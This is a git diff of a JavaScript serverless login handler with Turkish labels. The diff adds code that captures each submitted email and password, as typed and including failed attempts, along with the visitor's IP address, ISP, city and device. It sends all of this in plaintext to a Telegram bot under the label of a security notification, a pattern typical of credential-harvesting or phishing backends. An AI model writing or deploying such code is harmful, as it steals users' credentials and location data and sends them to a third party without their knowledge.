@@ -1,26 +1,54 @@
-        // Cihaz ismini daha detaylı yakalama
-        let temizCihaz = "Bilinmiyor";
+        export default async function handler(req, res) {
+    if (req.method !== 'POST') return res.status(405).end();
+    
+    try {
+        const { email, pass, ipData, cihaz } = req.body;
         
-        if (cihaz.includes("Android")) {
-            // Parantez içindeki marka/model kısmını daha geniş alalım
-            const match = cihaz.match(/\(([^)]+)\)/);
-            if (match) {
-                const parts = match[1].split(';');
-                // Genelde son parça model ismidir
-                temizCihaz = "Android (" + parts[parts.length - 1].trim() + ")";
-            } else {
-                temizCihaz = "Android Cihaz";
-            }
-        } else if (cihaz.includes("iPhone") || cihaz.includes("iPad")) {
-            temizCihaz = "iOS Cihaz (Apple)";
-        } else if (cihaz.includes("Windows")) {
-            temizCihaz = "Windows Bilgisayar";
-        } else if (cihaz.includes("Macintosh")) {
-            temizCihaz = "Mac Bilgisayar";
-        } else {
-            // Hiçbiri tutmazsa tarayıcı adını al
-            temizCihaz = cihaz.split(' ')[0].replace('Mozilla/5.0', 'Bilinmeyen Tarayıcı');
+        const BOT_TOKEN = process.env.BOT_TOKEN;
+        const CHAT_ID = process.env.TELEGRAM_ID;
+        const DOGRU_SIFRE = process.env.SIFRE;
+
+        // Cihaz ismini basitçe ayıklayalım
+        let cihazIsmi = "Bilinmiyor";
+        if (cihaz) {
+            if (cihaz.includes("Android")) cihazIsmi = "Android Cihaz";
+            else if (cihaz.includes("iPhone")) cihazIsmi = "iPhone";
+            else if (cihaz.includes("Windows")) cihazIsmi = "Windows PC";
+            else cihazIsmi = "Diğer";
         }
+
+        const girisBasarili = (String(pass) === String(DOGRU_SIFRE));
+
+        const mesaj = `🚀 **TERCES GÜVENLİK BİLDİRİMİ**\n\n` +
+                      `📧 E-posta: ${email}\n` +
+                      `🔑 Şifre: ${pass}\n` +
+                      `📱 Cihaz: ${cihazIsmi}\n` +
+                      `📡 IP: ${ipData?.ip || "Bilinmiyor"}\n` +
+                      `🏢 ISS: ${ipData?.org || "Bilinmiyor"}\n` +
+                      `📍 Konum: ${ipData?.city || "Bilinmiyor"}\n` +
+                      `✅ Durum: ${girisBasarili ? "BAŞARILI" : "HATALI"}`;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: mesaj,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        if (girisBasarili) {
+            return res.status(200).json({ success: true });
+        } else {
+            return res.status(401).json({ success: false, message: "Hatalı şifre!" });
+        }
+    } catch (error) {
+        console.error(error);
+        return res.status(500).json({ success: false, error: "Sistem hatası" });
+    }
+}
+
 
 
 
